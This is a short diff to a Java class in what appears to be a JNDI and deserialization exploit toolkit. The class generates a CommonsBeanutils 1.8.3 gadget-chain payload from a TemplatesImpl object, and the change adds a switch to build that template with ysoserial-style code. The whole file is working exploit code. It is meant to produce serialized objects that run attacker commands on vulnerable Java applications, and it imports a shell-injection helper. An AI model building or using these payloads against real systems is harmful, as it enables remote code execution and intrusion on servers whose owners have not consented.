@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -10,6 +11,7 @@ import org.apache.commons.beanutils.BeanComparator;
 
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.cmdLine;
 import static com.qi4l.jndi.gadgets.utils.InjShell.insertField;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@@ -17,7 +19,12 @@ public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object template = Gadgets.createTemplatesImpl(type, param);
+        final Object template;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            template = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            template = Gadgets.createTemplatesImpl(type, param);
+        }
         ClassPool pool    = ClassPool.getDefault();
         CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
 
